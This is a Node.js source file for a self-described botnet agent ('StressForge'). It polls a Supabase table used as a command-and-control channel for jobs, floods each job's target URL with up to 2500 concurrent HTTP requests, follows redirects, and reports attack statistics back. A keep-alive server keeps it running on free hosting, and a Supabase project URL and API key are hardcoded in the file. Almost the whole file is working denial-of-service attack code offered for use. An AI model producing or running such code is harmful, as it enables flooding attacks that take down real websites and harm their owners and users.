/**
 * STRESSFORGE BOTNET AGENT V3.6 (ENTERPRISE)
 * - Feature: Smart Redirection Following (301/302)
 * - Safety: Memory Governor (Max 2500 threads) to prevent Render Free Tier crash
 */
const https = require('https');
const http = require('http');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
const MAX_SAFE_CONCURRENCY = 2500;

// --- RENDER KEEP-ALIVE ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V3.6 Active'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: ROBUST REQUEST ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); }
                });
            });
            req.on('error', (e) => { 
                console.error('[NET-ERR] Supabase Connection Failed:', e.message); 
                reject(e); 
            });
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[36m[AGENT] Initialized V3.6. Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    
    // SAFETY GOVERNOR
    if (job.concurrency > MAX_SAFE_CONCURRENCY) {
        console.log(`\x1b[31m[SAFETY] Capping threads from ${job.concurrency} to ${MAX_SAFE_CONCURRENCY} (RAM Limit)\x1b[0m`);
        job.concurrency = MAX_SAFE_CONCURRENCY;
    }

    activeJob = job;
    
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    
    // Telemetry
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    
    const startTime = Date.now();
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
    
    const agent = new https.Agent({ keepAlive: true, maxSockets: 5000 });
    
    let headers = job.headers || {};
    if (typeof headers === 'string') {
        try { headers = JSON.parse(headers); } catch(e) { headers = {}; }
    }

    const reqOptions = {
        agent,
        method: job.method || 'GET',
        headers: headers,
    };
    reqOptions.headers['Host'] = targetUrl.host;
    reqOptions.headers['Cache-Control'] = 'no-cache';

    // Redirect Handler Wrapper
    const performRequest = (currentUrl, currentOptions, onFinish) => {
        const lib = currentUrl.protocol === 'https:' ? https : http;
        const req = lib.request(currentUrl, currentOptions, (res) => {
            // Follow Redirects (301, 302, 307, 308)
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                res.resume(); 
                try {
                    const newUrl = new URL(res.headers.location, currentUrl.href);
                    performRequest(newUrl, currentOptions, onFinish);
                } catch(e) {
                    onFinish(res, e); 
                }
                return;
            }
            res.resume();
            onFinish(res, null);
        });
        req.on('error', (e) => onFinish(null, e));
        
        if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
             try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
        }
        req.end();
    };

    const flood = () => {
        if (!running) return;
        const start = Date.now();
        
        performRequest(targetUrl, reqOptions, (res, err) => {
             const lat = Date.now() - start;
             jobLatencySum += lat;
             jobReqsForLatency++;
             
             if (!err && res && res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
             else jobFailed++;
             
             totalRequests++;
             flood();
        });
    };

    for(let i=0; i<job.concurrency; i++) flood();

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
                 current_rps: rps,
                 total_success: jobSuccess,
                 total_failed: jobFailed,
                 avg_latency: avgLat
             });
        } catch(e) { console.error('[SYNC-ERR] Failed to report stats'); }

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished by Agent Timeout' });
            console.log('[COMPLETE] Attack finished successfully.');
        }
    }, 2000);
};

// Poll every 3s
setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            console.log('Received Job:', job.id);
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
